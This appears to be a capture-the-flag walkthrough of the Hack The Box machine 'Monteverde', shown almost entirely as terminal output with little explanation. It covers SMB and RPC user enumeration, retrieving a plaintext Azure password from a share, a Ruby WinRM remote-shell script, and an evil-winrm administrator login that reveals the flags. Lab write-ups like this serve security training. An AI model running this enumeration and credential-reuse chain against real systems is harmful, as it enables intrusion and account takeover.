From enum4linux
```console
 =============================
|    Users on 10.10.10.172    |
 =============================
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)

user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan

smbclient -L 10.10.10.172 -U mhope

```console
kali@kali:~/HTB/Machines/Monteverde$ rpcclient -U "" 10.10.10.172 -L
Enter WORKGROUP\'s password:
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
rpcclient $>
```

```console
kali@kali:~/HTB/Machines/Monteverde$ smbclient -L 10.10.10.172 -U SABatchJobs
Enter WORKGROUP\SABatchJobs's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        azure_uploads   Disk
        C$              Disk      Default share
        E$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
        users$          Disk
SMB1 disabled -- no workgroup available
kali@kali:~/HTB/Machines/Monteverde$ smbclient -U 'SABatchJobs' //10.10.10.172/users$
Enter WORKGROUP\SABatchJobs's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020

                524031 blocks of size 4096. 518419 blocks available
smb: \> cd dgalanos\
smb: \dgalanos\> ls
  .                                   D        0  Fri Jan  3 08:12:30 2020
  ..                                  D        0  Fri Jan  3 08:12:30 2020

                524031 blocks of size 4096. 518419 blocks available
smb: \dgalanos\> cd ..
smb: \> cd mhope\
smb: \mhope\> pwd
Current directory is \\10.10.10.172\users$\mhope\
smb: \mhope\> ls
  .                                   D        0  Fri Jan  3 08:41:18 2020
  ..                                  D        0  Fri Jan  3 08:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020

                524031 blocks of size 4096. 518419 blocks available
smb: \mhope\> mget azure.xml
Get file azure.xml? yes
getting file \mhope\azure.xml of size 1212 as azure.xml (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \mhope\>
```


```console
kali@kali:~/HTB/Machines/Monteverde$ cat azure.xml
▒▒<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
kali@kali:~/HTB/Machines/Monteverde$
```
```ruby
require 'winrm'

conn = WinRM::Connection.new(
  endpoint: 'http://10.10.10.172:5985/wsman',
  user: 'mhope',
  password: '4n0therD4y@n0th3r$',
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        print "PS > "
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```

```console
kali@kali:~/HTB/Machines/Monteverde$ ruby mon_rm.rb
PS > whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
PS > ls -force


    Directory: C:\Users\mhope\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hsl         1/3/2020   5:24 AM                My Music
d--hsl         1/3/2020   5:24 AM                My Pictures
d--hsl         1/3/2020   5:24 AM                My Videos
-a-hs-         1/3/2020   5:24 AM            402 desktop.ini


PS > cd ../Desktop
PS > ls -force


    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-         1/3/2020   5:24 AM            282 desktop.ini
-ar---         1/3/2020   5:48 AM             32 user.txt


PS > type user.txt
4961976bd7d8f4eeb2ce3705e2f212f2
PS >
```

```console
kali@kali:~/HTB/Machines/Monteverde$ evil-winrm  -i 10.10.10.172 -u administrator -p d0m@in4dminyeah!
NOTE: Gem::Specification#rubyforge_project= is deprecated with no replacement. It will be removed on or after 2019-12-01.
Gem::Specification#rubyforge_project= called from /var/lib/gems/2.5.0/specifications/gyoku-1.3.1.gemspec:17.
NOTE: Gem::Specification#rubyforge_project= is deprecated with no replacement. It will be removed on or after 2019-12-01.
Gem::Specification#rubyforge_project= called from /var/lib/gems/2.5.0/specifications/logging-2.2.2.gemspec:18.
NOTE: Gem::Specification#rubyforge_project= is deprecated with no replacement. It will be removed on or after 2019-12-01.
Gem::Specification#rubyforge_project= called from /var/lib/gems/2.5.0/specifications/little-plugger-1.1.4.gemspec:18.
NOTE: Gem::Specification#rubyforge_project= is deprecated with no replacement. It will be removed on or after 2019-12-01.
Gem::Specification#rubyforge_project= called from /var/lib/gems/2.5.0/specifications/nori-2.6.0.gemspec:17.

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   3:06 PM                SQL Server Management Studio
d-----         1/2/2020   3:10 PM                Visual Studio 2017
d-----         1/3/2020   5:28 AM                WindowsPowerShell


*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         1/3/2020   5:48 AM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
12909612d25c8dcf6e5a07d1a804a0bc
*Evil-WinRM* PS C:\Users\Administrator\desktop>
```

